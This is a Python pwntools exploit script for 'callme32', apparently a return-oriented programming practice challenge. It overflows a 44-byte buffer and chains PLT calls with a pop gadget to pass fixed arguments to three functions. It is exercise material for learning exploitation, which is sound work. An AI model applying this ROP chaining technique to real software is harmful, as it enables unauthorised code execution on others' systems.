#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template callme32
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('callme32')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  '.'

io = start()

one_plt = p32(0x80484f0)
two_plt = p32(0x8048550)
three_plt = p32(0x80484e0)
exit_plt = p32(0x8048510)
p_one = p32(0xdeadbeef)
p_two = p32(0xcafebabe)
p_three = p32(0xd00df00d)

pop_gadget = p32(0x080487f9)  # pop esi; pop edi; pop ebp; ret; 

aargs = p_one + p_two + p_three

#for k,v in exe.symbols.items():
#	print(k, hex(v))

buf = "A" * 44
buf += one_plt
buf += pop_gadget
buf += aargs
buf += two_plt
buf += pop_gadget
buf += aargs
buf += three_plt
buf += pop_gadget
buf += aargs


# python3 callme32.py DEBUG

write('in.txt', buf)
#print(buf)
io.sendline(buf)
io.interactive()

